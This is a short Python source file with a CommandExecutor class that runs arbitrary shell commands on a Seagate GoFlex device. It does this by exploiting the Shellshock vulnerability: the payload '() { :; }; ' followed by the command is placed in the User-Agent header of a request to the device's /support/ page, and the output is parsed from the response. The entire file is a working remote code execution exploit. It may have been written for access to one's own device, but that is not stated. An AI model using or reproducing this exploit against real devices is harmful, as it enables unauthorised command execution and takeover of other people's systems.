import re

import requests

OUTPUT_PREFIX = re.compile(rb'Your assigned port is \d+\s*([\s\S]*)')


class CommandExecutor:

    @classmethod
    def execute(cls, ip: str, command: str) -> bytes:
        """
        Executes a shell command and returns the output.
        """
        try:
            output = cls._unsafe_execute(ip, command)
        except (requests.RequestException, ConnectionError) as exception:
            raise ConnectionError("Can't connect to the GoFlex. Are you sure you wrote the correct IP address?") \
                from exception

        return OUTPUT_PREFIX.match(output).group(1)

    @staticmethod
    def _unsafe_execute(ip: str, command: str) -> bytes:
        """
        Exploit shellshock vulnerability to get a shell on the GoFlex device.
        """
        response = requests.get(
            url=f"http://{ip}/support/",
            headers={
                "User-Agent": "() { :; }; " + command
            }
        )

        return response.content.strip()
